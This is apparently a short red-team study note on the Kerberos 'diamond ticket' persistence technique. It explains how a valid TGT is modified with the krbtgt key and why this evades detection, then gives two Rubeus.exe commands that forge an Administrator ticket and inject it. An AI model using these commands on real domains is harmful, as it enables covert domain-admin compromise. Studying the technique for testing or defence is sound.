---
tags:
  - persistence
cssclasses: []
---
- A diamond ticket is created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account
- This, like Golden Ticket, deals with abusing TGS-REQ
- Golden ticket was a TGT forging attack whereas diamond ticket is a TGT modification attack.
- The persistence lifetime will depend on the krbtgt account.
- A diamond ticket is more opsec safe as it has:
	- Valid ticket times because a TGT issued by the DC is modified.
	- In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged.

```batch title:"Create diamond ticket"
Rubeus.exe diamond /krbkey:krbtgt_aes256_key /user:username /password:password /enctype:aes /ticketuser:Administrator /domain:domain.name /dc:domain-controller-fqdn /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```batch title:"Create diamond ticket as another domain user (no username or password required)"
Rubeus.exe diamond /krbkey:krbtgt_aes256_key /tgtdeleg /enctype:aes /ticketuser:administrator /domain:domain.name /dc:domain-controller-fqdn /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```



